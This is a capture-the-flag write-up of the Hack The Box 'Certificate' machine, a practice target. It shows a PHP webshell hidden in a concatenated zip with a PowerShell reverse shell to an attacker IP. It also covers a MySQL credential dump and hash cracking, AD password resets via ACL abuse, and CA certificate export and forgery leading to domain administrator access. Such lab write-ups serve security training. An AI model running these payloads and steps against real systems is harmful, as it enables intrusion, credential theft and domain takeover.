---
title: "HTB machine : Certificate"
description: Walkthrough of the HTB Certificate machine, covering PHP webshell upload, MySQL enumeration, AD credential cracking, and privilege escalation via ESC3 in ADCS.
image: /images/certificate/certificate.png
date: 2025-06-03 20:00:00 +/-TTTT
categories: [HTB]
tags: [ADCS, ESC3, pentest, Active Directory ]     # TAG names should always be lowercase
---


## Overview

- **Initial Access**: Upload PHP reverse shell through zip file
- **Enumeration**: Found DB creds → Dumped users from MySQL
- **User Access**: Cracked hash for `sara.b` and found AD access
- **Privilege Escalation**:
  - Used BloodHound to find ACL abuse → Reset passwords
  - Found certificate template vulnerable to **ESC3**
  - Forged PFX → Auth as `administrator`

---
## Enumeration

### nmap scan

```sh
Nmap scan report for 10.10.11.71
Host is up (0.033s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Did not follow redirect to http://certificate.htb/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 05:04:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-04T05:06:08+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-06-04T05:06:08+00:00; +8h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-04T05:06:08+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-04T05:06:08+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-04T05:05:27
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  3 23:06:07 2025 -- 1 IP address (1 host up) scanned in 94.24 seconds

```
## Initial Access via File Upload

![alt text](/images/certificate/uploadfile.png)

### File Creation

```bash
echo "Hi zenon" > zenon.pdf
mkdir exploit
mv zenon.pdf exploit
cd exploit
zip benign.zip zenon.pdf
```

### Create Malicious Zip

```php
// zenon.php
<?php
shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('10.10.14.185',4444); ...\"");
?>
```

```bash
mkdir malicious
cp zenon.php malicious/
zip -r malicious.zip malicious/
cat benign.zip malicious.zip > zenon.zip
```

### Start Listener

```bash
nc -lnvp 4444
```

>  Reverse shell triggered when uploading `zenon.zip`

```sh
$ nc -lnvp 4444                                 
listening on [any] 4444 ...
connect to [10.10.14.185] from (UNKNOWN) [10.10.11.71] 60158

PS C:\xampp\htdocs\certificate.htb\static\uploads\c8164902a732f2975e80b5d849a3d56e\malicious> ls


    Directory: C:\xampp\htdocs\certificate.htb\static\uploads\c8164902a732f2975e80b5d849a3d56e\malicious


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         6/3/2025   2:40 PM            589 zenon.php                                                             

PS C:\xampp\htdocs\certificate.htb> type db.php
```

## Database Credentials

### Found in `C:\xampp\htdocs\certificate.htb\db.php`

```php
$db_user = 'certificate_webapp_user';
$db_passwd = 'cert!f!c@teDBPWD';
```

###  MySQL Dump

```sql
PS C:\xampp\mysql\bin> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -D Certificate_WEBAPP_DB -e "SELECT * FROM users;"    
```

>  Found user `sara.b` with bcrypt hash
> Cracked with:

```bash
hashcat -m 3200 -a 0 <hash> /opt/rockyou.txt
```

> Password: `Blink182`

---

## AD Access with sara.b

```bash
nxc smb 10.10.11.71 -u 'sara.b' -p 'Blink182'
```

>  Logged into SMB as `sara.b`

---

##  BloodHound Enumeration

```bash
faketime "$(ntpdate -q 10.10.11.71 | awk '/^[0-9]/ { print $1\" \"$2; exit }')" bloodhound-python -u 'sara.b' -p 'Blink182' -d certificate.htb -ns 10.10.11.71 -c all --zip
```

## User flag
![alt text](/images/certificate/rdpgroup.png)


![alt text](/images/certificate/saragroup.png)

![alt text](/images/certificate/memberof.png)

>  ACL discovered: `sara.b` can reset passwords for:

* `ryan.k`
* `lion.sk`

---

## Pivot to lion.sk

```bash
bloodyAD -u sara.b -p 'Blink182' --dc-ip 10.10.11.71 set password lion.sk 'P@ssw0rd'
evil-winrm -i 10.10.11.71 -u lion.sk -p 'P@ssw0rd'
```

> We got the user flag

---

## Privilege escalation

###  Certificate Vulnerability (ESC3)

###  Enumerate Templates

```bash
certipy-ad find -text -dc-ip 10.10.11.71 -u lion.sk -p 'P@ssw0rd'
```

>  `Domain CRA Managers` → vulnerable to **ESC3**
> Use `ryan.k` (also with ACL abuse):

```bash
bloodyAD -u sara.b -p 'Blink182' --dc-ip 10.10.11.71 set password ryan.k 'P@ssw0rd'
evil-winrm -i 10.10.11.71 -u ryan.k -p 'P@ssw0rd'
```

---

##  Exploit SeManageVolumePrivilege

```bash
upload SeManageVolumeExploit.exe
./SeManageVolumeExploit.exe
```

---

##  Export Root Certificate

```powershell
certutil -exportPFX my "Certificate-LTD-CA" C:\Users\Public\ca.pfx
```

>  Downloaded `ca.pfx`

---

##  Forge Certificate as Administrator

```bash
certipy-ad forge -ca-pfx ca.pfx \
-upn 'administrator@certificate.htb' \
-subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' \
-out forged_admin.pfx
```

```bash
faketime "$(ntpdate -q 10.10.11.71 | awk '/^[0-9]/ { print $1\" \"$2; exit }')" \
certipy-ad auth -pfx forged_admin.pfx -dc-ip 10.10.11.71 -username 'administrator' -domain 'certificate.htb'
```

>  Got hash:

```text
aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

---

##  Root Shell

```bash
evil-winrm -i 10.10.11.71 -u administrator -H d804304519bf0143c14cbf1c024408c6
```

>  here we go, we got the root flag


